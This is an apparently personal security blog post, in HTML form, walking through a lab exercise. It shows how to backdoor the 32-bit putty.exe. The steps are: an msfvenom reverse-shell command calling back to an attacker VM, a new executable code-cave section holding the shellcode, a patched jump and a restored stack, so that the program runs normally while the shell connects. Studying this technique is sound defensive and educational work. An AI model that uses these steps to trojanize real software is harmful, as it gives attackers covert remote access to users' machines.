@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="dark">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KageHayashi" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Backdooring PE Files 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><script src="/assets/js/DPlayer.min.js"></script></head>
+
+
+  <body>
+    <div id="app">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
+
+<div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img id="author_photo" src="/images/dark.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Backdooring PE Files</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-03-10 21:26:54
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Malware/" title="Malware">
+                    #Malware
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>This post is written to help me better understand the process of backdooring portable executables (PEs) by using “code caves” and redirecting execution flow. </p>
+<p>Inspiration came from <a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a>, but I’ll be using <code>putty.exe</code> as the target binary instead.</p>
+<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>In this post, we’ll be backdooring PEs through these high level steps:</p>
+<ul>
+<li>Manually introduce a code cave by adding a new PE section</li>
+<li>Add shellcode to our new PE section</li>
+<li>Patch execution flow of the PE to run the shellcode</li>
+<li>Give execution flow back to the PE after shellcode runs</li>
+</ul>
+<p>The last two steps are the most complicated and the whole process is easier said than done. </p>
+<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>We’ll be utilizing a Windows 10 victim VM and a Kali Linux attacker VM throughout the lab. Their respective IPs are listed below (noted for catching rev shells):</p>
+<ul>
+<li>Kali - <code>192.168.248.148</code></li>
+<li>Windows 10 - <code>192.168.248.150</code></li>
+</ul>
+<p>Here are the tools we’ll be using:</p>
+<ul>
+<li><code>msfvenom</code> - to generate shellcode</li>
+<li><code>CFF Explorer</code> - to manipulate PE sections</li>
+<li><code>HxD</code> - to patch our binary</li>
+<li><code>x32dbg</code> - to debug&#x2F;patch</li>
+</ul>
+<p>Our target PE of choice will be <code>putty.exe</code> - specifically the <code>32-bit x86</code> version, which can be downloaded from:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></li>
+</ul>
+<h1 id="Manual-Proof-of-Concept-POC"><a href="#Manual-Proof-of-Concept-POC" class="headerlink" title="Manual Proof-of-Concept (POC)"></a>Manual Proof-of-Concept (POC)</h1><p>Before we try to do any redirection of execution flow, let’s manually step through the theories of this technique: generating shellcode, placing it in a new PE section, and manually redirecting the EIP to our shellcode.</p>
+<h2 id="msfvenom-Shellcode"><a href="#msfvenom-Shellcode" class="headerlink" title="msfvenom Shellcode"></a>msfvenom Shellcode</h2><p>To begin, generate a simple reverse shell with <code>msfvenom</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.148 LPORT=8080 -o rev.exe</span><br></pre></td></tr></table></figure>
+
+<p>We’ll need to get the raw hex-bytes for later. This can be done using <code>xxd</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/backdooring-pe-files/image-20240310203628586.png"></p>
+<h2 id="Adding-a-New-PE-Section"><a href="#Adding-a-New-PE-Section" class="headerlink" title="Adding a New PE Section"></a>Adding a New PE Section</h2><p>Open <code>putty.exe</code> in CFF Explorer, navigate to <code>Section Headers</code>, and right-click to <code>Add Section (Empty Space)</code>. Make sure to make the size of the section at least 324 bytes - the size of our shellcode. Here, I’ll specify 200h - which is 512 bytes.</p>
+<p><img src="/posts/backdooring-pe-files/image-20240310151913464.png"></p>
+<p>I’ll rename the section to <code>.code</code> and right-click <code>Change Section Flags</code><br><img src="/posts/backdooring-pe-files/image-20240310152255772.png"></p>
+<p>Make sure that the section is readable, writeable, executable, and contains code.<br><img src="/posts/backdooring-pe-files/image-20240310152340682.png"></p>
+<p>Take note that the <code>Raw Address</code> of the section is <code>00166200</code> and make sure to save the changes.</p>
+<h2 id="Insert-Shellcode-into-New-Section"><a href="#Insert-Shellcode-into-New-Section" class="headerlink" title="Insert Shellcode into New Section"></a>Insert Shellcode into New Section</h2><p>From here, open the binary in <code>HxD</code>. Navigate to <code>Search -&gt; Go to...</code></p>
+<p><img src="/posts/backdooring-pe-files/image-20240310152743665.png"></p>
+<p>Go to offset <code>00166200</code>, where our new section is.</p>
+<p><img src="/posts/backdooring-pe-files/image-20240310152827261.png"></p>
+<p>You should see an empty section of code.<br><img src="/posts/backdooring-pe-files/image-20240310152907463.png"></p>
+<p>We’ll insert our shellcode into this. Using the same <code>xxd</code> command before, copy the hex output.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/backdooring-pe-files/image-20240310203837253.png"></p>
+<p>Right-click in <code>HxD</code> and <code>Paste write</code></p>
+<p><img src="/posts/backdooring-pe-files/image-20240310153045244.png"></p>
+<p>The newly pasted code section should be red. Make sure to save the changes.</p>
+<p><img src="/posts/backdooring-pe-files/image-20240310153106387.png"></p>
+<h2 id="Manually-Trigger-the-Shellcode"><a href="#Manually-Trigger-the-Shellcode" class="headerlink" title="Manually Trigger the Shellcode"></a>Manually Trigger the Shellcode</h2><p>Now that our shellcode is in the binary, let’s try to manually force it to execute in <code>x32dbg</code>. </p>
+<p>Open the binary in <code>x32dbg</code> and navigate to <code>Memory Map</code>. We should see the <code>.code</code> section at <code>010DF000</code>. This address could have also been calculated by using the base address of <code>putty.exe</code> at <code>00F70000</code> and adding the relative virtual address of the <code>.code</code> section of <code>0016F000</code> to get <code>00F70000 + 0016F000 = 010DF000</code></p>
+<p><img src="/posts/backdooring-pe-files/image-20240310153626835.png"></p>
+<p>Double-click the section and if we follow it in dump, we should see the hex bytes of our shellcode.<br><img src="/posts/backdooring-pe-files/image-20240310154039487.png"></p>
+<p>With everything in place, we can start a listener on our attacker machine, manually set the EIP to <code>010DF000</code> (1) and continue execution (2). We should see a reverse shell connect back (3).</p>
+<p><img src="/posts/backdooring-pe-files/image-20240310154355294.png"></p>
+<p>Here is the whole process in action:<br><img src="/posts/backdooring-pe-files/backdoor_pe.gif"></p>
+<p>We have successfully triggered the shellcode. Now, we know that the theories are in place and we have laid the groundworks for what’s coming next.</p>
+<h1 id="Execution-Redirection"><a href="#Execution-Redirection" class="headerlink" title="Execution Redirection"></a>Execution Redirection</h1><p>With the help of a debugger, we were able to manually trigger our shellcode. Now, we’ll attempt to patch the binary so that the shell triggers automatically and redirects execution back to <code>putty.exe</code></p>
+<p>The patching process can be a little complicated and tedious. The high level step are as follows:</p>
+<ol>
+<li>Prepend the shellcode with <code>pushad</code> and <code>pushfd</code> instructions</li>
+<li>Overwrite a 5 byte instruction in <code>putty.exe</code> with a jump to our shellcode</li>
+<li>Append the shellcode with code that will restore the stack frame and redirect execution back to <code>putty.exe</code></li>
+</ol>
+<h2 id="Prepending-our-Shellcode"><a href="#Prepending-our-Shellcode" class="headerlink" title="Prepending our Shellcode"></a>Prepending our Shellcode</h2><p>Before anything, the first modification we want to make to our shellcode is to prepend it with the <code>pushfd</code> and <code>pushad</code> instructions. These instructions will push the contents of registers right before shellcode execution onto the stack. We will want to restore these states after we execute our shellcode.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/pusha:pushad">https://www.felixcloutier.com/x86/pusha:pushad</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.felixcloutier.com/x86/pushf:pushfd:pushfq">https://www.felixcloutier.com/x86/pushf:pushfd:pushfq</a></li>
+</ul>
+<p>This process is relatively easy. <code>pushad</code>‘s opcode is <code>60</code> and <code>pushfd</code>‘s opcode is <code>9C</code>. We just need to insert these right before our shellcode in <code>HxD</code>. I recommend putting <code>609C</code> before your shellcode and just pasting it as a whole into <code>HxD</code>.</p>
+<p><img src="/posts/backdooring-pe-files/image-20240310193300866.png"></p>
+<h2 id="Jumping-to-our-Shellcode"><a href="#Jumping-to-our-Shellcode" class="headerlink" title="Jumping to our Shellcode"></a>Jumping to our Shellcode</h2><p>The next step we want to do is to find a 5 byte instruction where we can overwrite with <code>jmp &lt;addr_of_shellcode&gt;</code>.</p>
+<p>Step through the execution of <code>putty.exe</code> in a debugger. We see a 5 byte instruction at <code>0073FA61</code>. We’ll take a note of this instruction and the next for later.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0073FA61 | E8 3A070000              | call putty.7401A0                       | (assembly: call 0x007401A0)</span><br><span class="line">0073FA66 | 6A 01                    | push 1                                  |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/backdooring-pe-files/image-20240310193447062.png"></p>
+<p>Overwrite the instruction with a jump to our shellcode. In this case, it’s at <code>0080F000</code><br><img src="/posts/backdooring-pe-files/image-20240310193538819.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 0x0080F000</span><br></pre></td></tr></table></figure>
+
+<p>To patch, Right-click -&gt; <code>Assemble</code> and put our jump instruction in.<br><img src="/posts/backdooring-pe-files/image-20240310193615493.png"></p>
+<p><img src="/posts/backdooring-pe-files/image-20240310193630408.png"></p>
+<p><img src="/posts/backdooring-pe-files/image-20240310193644246.png"></p>
+<p>Next, we’ll attempt to add a few modifications to our shellcode to redirect the execution back to <code>putty.exe</code>.</p>
+<h2 id="Appending-our-Shellcode"><a href="#Appending-our-Shellcode" class="headerlink" title="Appending our Shellcode"></a>Appending our Shellcode</h2><p>There are several places where we need to modify our shellcode in order to have the redirection work properly. Mainly, the modifications consist of:</p>
+<ul>
+<li>Unblocking the thread by patching <code>WaitForSignaledObject</code></li>
+<li>Restoring the stack frame and register states with <code>popfd</code> and <code>popad</code></li>
+<li>Restore the overwritten instruction</li>
+<li>Jump to next instruction right after overwritten instruction</li>
+</ul>
+<h3 id="Unblocking-the-Thread"><a href="#Unblocking-the-Thread" class="headerlink" title="Unblocking the Thread"></a>Unblocking the Thread</h3><p>If we ran the previous modification with the jump instruction to our shellcode, you’ll notice that although we catch the reverse shell, the <code>putty.exe</code> GUI won’t display afterwards.</p>
+<p>The reason <code>putty.exe</code> isn’t showing its GUI is because the shellcode execution is blocking the thread by calling <code>WaitForSignaledObject</code> with <code>-1 (INFINITE)</code>  as the argument - essentially blocking it forever. We want to make sure the value passed in as the argument is <code>0</code>.</p>
+<p>The instruction <code>dec esi</code> at <code>0080F11B</code> changes ESI to <code>-1</code>, which is then pushed onto the stack as an argument to <code>WaitForSignaledObject</code><br><img src="/posts/backdooring-pe-files/image-20240310201003514.png"></p>
+<p>We can attempt to NOP out the instruction, so that ESI stays <code>0</code> - telling the thread to wait for 0 seconds before unblocking.<br><img src="/posts/backdooring-pe-files/image-20240310201017372.png"></p>
+<h3 id="Restore-Stack-Frame-Execution"><a href="#Restore-Stack-Frame-Execution" class="headerlink" title="Restore Stack Frame &amp; Execution"></a>Restore Stack Frame &amp; Execution</h3><p>Now, we modify the end of the shellcode to restore our stack frame and register states to before our shellcode execution. Then, we can pass execution back to <code>putty.exe</code>.</p>
+<p>At the end of our shellcode, you’ll notice a <code>call ebp</code> instruction. This essentially closes the <code>putty.exe</code> process after our thread has executed. We will start patching from this last instruction.<br><img src="/posts/backdooring-pe-files/image-20240310205922936.png"></p>
+<p>We’ll want to replace this with an instruction that restores our ESP to before our shellcode execution, but after our <code>pushad</code> and <code>pushfd</code> instructions. To find this value, we can put a breakpoint after the <code>pushad</code> and <code>pushfd</code> instructions and note the ESP right after. In this case, it’s <code>012FFB00</code>.<br><img src="/posts/backdooring-pe-files/image-20240310205720973.png"></p>
+<p>The ESP after our shellcode execution is <code>012FF8FC</code><br><img src="/posts/backdooring-pe-files/image-20240310205825552.png"></p>
+<p>This means that the stack grew by <code>0x204</code> bytes<br><img src="/posts/backdooring-pe-files/image-20240310205852824.png"></p>
+<p>From this, we will add the following instructions to our shellcode:</p>
+<ul>
+<li>Increase the ESP by <code>0x204</code> bytes to restore the stack</li>
+<li>Restore register states with <code>popfd</code> and <code>popad</code></li>
+<li>Add the instruction we previously overwrote in <a href="#Jumping-to-our-Shellcode">Jumping to our Shellcode</a></li>
+<li>Jump back to the instruction right after the instruction we overwrote</li>
+</ul>
+<p>In this case, we would append the following to the shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x204</span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">call 0x007401A0</span><br><span class="line">jmp 0x0073FA66</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/backdooring-pe-files/image-20240310201108577.png"></p>
+<p>Patch the file by Right-clicking -&gt; <code>Patches</code>, select all patches, and click <code>Patch File</code><br><img src="/posts/backdooring-pe-files/image-20240310212548779.png"><br><img src="/posts/backdooring-pe-files/image-20240310212627368.png"></p>
+<p>We’ll save the file as <code>putty_patched.exe</code></p>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>Now, we should have a fully patched file. Let’s test it. We should see our shellcode execute and pass execution right back to <code>putty.exe</code>. To the target, it’s as if nothing happened :D</p>
+<p><img src="/posts/backdooring-pe-files/backdoor_pe_patched.gif"></p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>We were able to successfully embed a reverse shell into a 32-bit <code>putty.exe</code> PE binary. It must be noted that this technique is extremely well signatured. Windows Defender was turned off throughout this lab - although at some points it still picked it up (can never trust when Defender is truly off…) </p>
+<p>Here’s a speedrun attempt :)</p>
+<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"/posts/backdooring-pe-files/demo.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>
+
+<hr>
+<p>References:<br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a><br><a target="_blank" rel="noopener" href="https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/">https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/install-ca-android/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-03-10 21:26:54
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Malware/" title="Malware">
+                        #Malware
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intro"><span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tools"><span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Manual-Proof-of-Concept-POC"><span class="toc-text">Manual Proof-of-Concept (POC)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom-Shellcode"><span class="toc-text">msfvenom Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adding-a-New-PE-Section"><span class="toc-text">Adding a New PE Section</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insert-Shellcode-into-New-Section"><span class="toc-text">Insert Shellcode into New Section</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Manually-Trigger-the-Shellcode"><span class="toc-text">Manually Trigger the Shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Execution-Redirection"><span class="toc-text">Execution Redirection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prepending-our-Shellcode"><span class="toc-text">Prepending our Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jumping-to-our-Shellcode"><span class="toc-text">Jumping to our Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Appending-our-Shellcode"><span class="toc-text">Appending our Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unblocking-the-Thread"><span class="toc-text">Unblocking the Thread</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Restore-Stack-Frame-Execution"><span class="toc-text">Restore Stack Frame &amp; Execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
